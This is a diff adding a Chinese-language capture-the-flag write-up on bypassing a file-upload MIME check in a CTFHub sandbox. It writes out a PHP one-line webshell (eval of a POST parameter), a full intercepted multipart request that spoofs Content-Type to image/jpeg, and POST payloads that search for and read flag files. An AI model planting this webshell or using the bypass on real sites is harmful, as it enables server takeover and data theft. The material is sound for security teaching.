@@ -1597,3 +1597,94 @@ t0ur1st=var_dump(file_get_contents('/var/www/html/flag_858924154.php'));
 提交`ctfhub{23218eb506abd3509c52ffb7}`即可。
 
 ------
+
+### MIME绕过
+
+MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型）是一种标准，用来标识文档、文件或字节流的性质和格式，其主要作用是让客户端（如浏览器）和服务器能够识别正在传输的数据到底是什么类型，从而用正确的应用程序来进行处理。常见的MIME标识和内容类型如下：
+
+|             MIME标识              |   内容类型   |            说明             |
+| :-------------------------------: | :----------: | :-------------------------: |
+|            text/plain             |    纯文本    | 普通文本（默认 ASCII 编码） |
+|             text/html             |  HTML 网页   |  浏览器需按 HTML 规则渲染   |
+|            image/jpeg             |   JPG 图片   |       二进制图像文件        |
+|            audio/mpeg             |   MP3 音频   |          音频文件           |
+|          application/zip          |  ZIP 压缩包  |       二进制压缩文件        |
+| application/x-www-form-urlencoded | 表单提交数据 |      POST 表单默认编码      |
+
+当我们在网页上选择一个文件并点击上传时，浏览器会读取该文件的扩展名和一些元数据，并根据一个内置的映射表，**自动设置好该文件的MIME类型**并将其放入HTTP请求头的`Content-Type` 字段中。上传文件时，浏览器会构造一个 `multipart/form-data` 格式的POST请求。
+
+编写PHP一句话木马。
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+用`burp suite`抓包修改HTTP请求头的`Content-Type`字段为`image/jpeg`即可。
+
+```
+POST / HTTP/1.1
+Host: challenge-36eefe4999f87a41.sandbox.ctfhub.com:10800
+Content-Length: 326
+Cache-Control: max-age=0
+Origin: http://challenge-36eefe4999f87a41.sandbox.ctfhub.com:10800
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP4IWxr6RUtO6EiZc
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-36eefe4999f87a41.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundaryP4IWxr6RUtO6EiZc
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: image/jpeg
+
+<?php @eval($_POST['t0ur1st']); ?>
+------WebKitFormBoundaryP4IWxr6RUtO6EiZc
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryP4IWxr6RUtO6EiZc--
+```
+
+上传成功后，靶机显示信息如下：
+
+> 上传文件相对路径
+> upload/1.php
+
+直接用`AntSword`连接靶机，可以在`/var/www/html/flag_244514578.php`中看到`flag`。
+
+```php
+<?php // ctfhub{2ad7cbd9c7842379921777fc}
+```
+
+或者用`HackBar`构造`POST`请求。在常见的位置查找`flag`文件。
+
+```php
+t0ur1st=var_dump(array_merge(
+    glob('*/flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机信息如下：
+
+> array(1) { [0]=> string(32) "/var/www/html/flag_244514578.php" }
+
+查看`flag`文件内容。
+
+```php
+t0ur1st=var_dump(file_get_contents('/var/www/html/flag_244514578.php'));
+```
+
+右键查看网页源码，在注释中可以找到`flag`。
+
+> string(42) "<?php // ctfhub{2ad7cbd9c7842379921777fc}
+> "
+
+提交`ctfhub{2ad7cbd9c7842379921777fc}`即可。
+
+------
